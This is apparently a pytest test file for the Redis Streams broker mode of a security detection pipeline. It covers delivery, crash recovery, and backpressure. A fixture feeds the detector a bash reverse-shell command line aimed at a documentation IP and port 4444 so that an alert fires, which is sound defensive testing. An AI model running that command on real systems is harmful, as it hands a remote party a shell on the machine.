"""Broker mode (Redis Streams): at-least-once delivery, crash recovery, backpressure.

Requires Redis; skipped unless AEGIS_TEST_REDIS_URL is set (CI provides it)."""

from __future__ import annotations

import os
import uuid
from collections.abc import Iterator

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import select

from aegis.config import PipelineMode, get_settings
from aegis.db import session_factory
from aegis.events.broker import StreamBroker
from aegis.events.pipeline import run_detection
from aegis.models import Event
from tests.conftest import Api, event, ingest

REDIS = os.environ.get("AEGIS_TEST_REDIS_URL")
pytestmark = pytest.mark.skipif(not REDIS, reason="AEGIS_TEST_REDIS_URL not set")

SHELL = {
    "pid": 9,
    "name": "bash",
    "executable": "/usr/bin/bash",
    "command_line": "bash -i >& /dev/tcp/198.51.100.23/4444 0>&1",
}


@pytest.fixture(autouse=True)
def broker_mode(monkeypatch: pytest.MonkeyPatch) -> Iterator[StreamBroker]:
    settings = get_settings()
    stream = f"aegis.test.{uuid.uuid4().hex[:8]}"
    monkeypatch.setattr(settings, "pipeline_mode", PipelineMode.BROKER)
    monkeypatch.setattr(settings, "redis_url", REDIS)
    monkeypatch.setattr(settings, "stream_name", stream)
    broker = StreamBroker()
    yield broker
    broker.client.delete(stream)


def _consume(
    broker: StreamBroker, consumer: str, ack: bool = True, reclaim_idle_ms: int = 60_000
) -> int:
    messages = broker.read(consumer, block_ms=100, reclaim_idle_ms=reclaim_idle_ms)
    ids = [uuid.UUID(i) for _, chunk in messages for i in chunk]
    with session_factory()() as db:
        events = list(db.scalars(select(Event).where(Event.id.in_(ids))))
        run_detection(db, events, trigger="worker")
    if ack:
        broker.ack([m for m, _ in messages])
    return len(ids)


def test_ingest_publishes_and_worker_detects(
    app_client: TestClient, admin: Api, agent_token: str, broker_mode: StreamBroker
) -> None:
    body = ingest(app_client, agent_token, [event(process=SHELL)]).json()
    assert body["pipeline"] == "broker" and body["accepted"] == 1
    assert admin.get("/api/v1/alerts").json()["total"] == 0  # not detected yet
    assert broker_mode.backlog() == 1
    assert _consume(broker_mode, "w1") == 1
    assert admin.get("/api/v1/alerts").json()["total"] == 1
    assert broker_mode.backlog() == 0


def test_crashed_consumer_messages_are_reclaimed_without_duplicates(
    app_client: TestClient, admin: Api, agent_token: str, broker_mode: StreamBroker
) -> None:
    ingest(app_client, agent_token, [event(process=SHELL)])
    # worker 1 processes but "crashes" before acknowledging
    assert _consume(broker_mode, "w1", ack=False) == 1
    # worker 2 reclaims the pending message and processes it again
    assert _consume(broker_mode, "w2", reclaim_idle_ms=0) == 1
    alerts = admin.get("/api/v1/alerts").json()["items"]
    assert len(alerts) == 1 and alerts[0]["hit_count"] == 1  # idempotent detection
    assert broker_mode.backlog() == 0


def test_backpressure_returns_503(
    app_client: TestClient,
    agent_token: str,
    monkeypatch: pytest.MonkeyPatch,
    broker_mode: StreamBroker,
) -> None:
    monkeypatch.setattr(get_settings(), "stream_max_pending", 2)
    assert ingest(app_client, agent_token, [event(), event()]).status_code == 200
    response = ingest(app_client, agent_token, [event()])
    assert response.status_code == 503
    assert response.headers["retry-after"] == "10"


def test_broker_down_returns_503(
    app_client: TestClient, agent_token: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(get_settings(), "redis_url", "redis://127.0.0.1:1/0")
    response = ingest(app_client, agent_token, [event()])
    assert response.status_code == 503
